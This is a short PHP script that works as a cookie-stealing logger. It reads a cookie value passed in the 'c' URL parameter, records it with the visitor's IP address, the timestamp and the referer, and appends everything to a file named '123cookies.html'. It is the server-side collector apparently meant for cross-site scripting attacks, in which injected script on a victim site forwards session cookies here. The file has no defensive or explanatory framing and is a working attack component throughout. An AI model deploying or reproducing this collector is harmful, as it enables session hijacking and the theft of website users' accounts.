<?php
$cookie = htmlentities($_GET['c']);
$ip = getenv('REMOTE_ADDR');
$date = date('D M j Y G:i:s T'); // EST
$referer = getenv('HTTP_REFERER');
$fp = fopen('123cookies.html', 'a');
fwrite($fp, 'Cookie: <b>'.$cookie.'</b><br /> IP: <b>'.$ip.'</b><br /> 
Date and Time: <b>'.$date.' </b><br /> Referer: <b>'.$referer.'</b><br /><br />');
fclose($fp);
?>
